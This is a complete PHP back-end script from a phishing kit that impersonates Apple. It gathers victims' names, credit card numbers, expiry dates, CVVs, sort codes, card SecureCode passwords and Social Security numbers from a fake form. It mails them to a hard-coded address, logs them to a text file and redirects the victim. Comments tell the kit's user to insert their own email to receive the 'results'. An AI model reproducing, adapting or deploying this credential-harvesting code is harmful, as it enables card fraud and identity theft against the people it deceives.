<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$Mornag .= "------------+| Mornag [Mr Bear] Tunisia |+------------\n";
$Mornag .= "Name             : ".$_POST['ho884989ld']."\n";
$Mornag .= "Credit Card N    : ".$_POST['nu89784945smb']."\n";
$Mornag .= "Expiration Date             : ".$_POST['exp898484654m']."/";
$Mornag .= "".$_POST['e54584948948xpy']."\n";
$Mornag .= "CVV                   : ".$_POST['cv8974786558v']."\n";
$Mornag .= "Sort Code                 : ".$_POST['s987489589ort']."\n";
$Mornag .= "Pass [Securecode/vbv]                 : ".$_POST['3666fgh4dfd']."\n";
$Mornag .= "SSN                 : ".$_POST['s987S74889Qsn']."\n";
$Mornag .= "------------+| Mornag [Mr Bear] Tunisia |+------------\n";
$Mornag .= "Fr0m $ip chek in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "tiflil-adham@gmx.fr"; // Change the email ===> put ur email
$bilsub = "[MrBear] Apple Card Information from that ip $ip";
$bilhead = "From: Apple Credit_Card <APPLE@>"; // You can change the email for better rzl
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$Mornag,$bilhead);
$v = fopen("../rz/index.txt","a"); // Send rzl in TXT file 
fwrite($v,$Mornag);
fclose($v);

header("Location: ../dn.php"); // Redirecting
?>